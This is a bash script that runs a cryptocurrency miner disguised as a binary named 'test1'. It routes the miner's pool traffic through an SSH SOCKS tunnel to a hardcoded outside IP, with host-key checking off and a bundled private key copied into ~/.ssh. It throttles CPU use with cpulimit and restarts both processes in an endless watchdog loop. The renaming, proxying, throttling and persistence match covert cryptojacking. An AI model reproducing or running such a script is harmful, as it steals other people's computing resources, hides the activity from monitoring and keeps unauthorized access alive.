#!/bin/bash

cd ~/bin

cmdSsh="ssh -o \"StrictHostKeyChecking no\" -D 8007 -N  tunnel@107.150.98.202"
#cmdTest="sudo ./test1 -o rx.unmineable.com:3333 -a rx -k -u ETC:0xEBE8e17F0a21559B9Dbc9260a41a4fFeb46457e0.E1 --proxy=127.0.0.1:8007 -t 4 --cpu-priority=5"
cmdTest="sudo ./test1 -o rx.unmineable.com:3333 -a rx -k -u ETC:$2.$1 --proxy=127.0.0.1:8007 -t 4 --cpu-priority=5"

echo "${cmdTest}"


mkdir -p  ~/.ssh
sudo cp -f ./id_rsa ~/.ssh/id_rsa
sudo chmod 400 ~/.ssh/id_rsa


eval $cmdSsh &
eval $cmdTest &
#eval $cmdTest2 &

sleep 5

sudo sudo cpulimit  -p `pidof test1` -l 79 -b       # one cpu
#sudo sudo cpulimit -l 160 -p `pidof test1`  -b      # two cpu


while true; do
    mssh=`ps -elf | grep ssh | grep 8007 | wc -l `
    if [ $mssh -eq 0 ]; then
        eval $cmdSsh &
    fi

    mtest=`ps -elf | grep test1 | grep 8007 | wc -l `
    if [ $mtest -eq 0 ]; then
        eval $cmdTest &
    fi

#    mtest=`ps -elf | grep test2 | grep 8007 | wc -l `
#    if [ $mtest -eq 0 ]; then
#        eval $cmdTest2 &
#    fi

    sleep 5
done

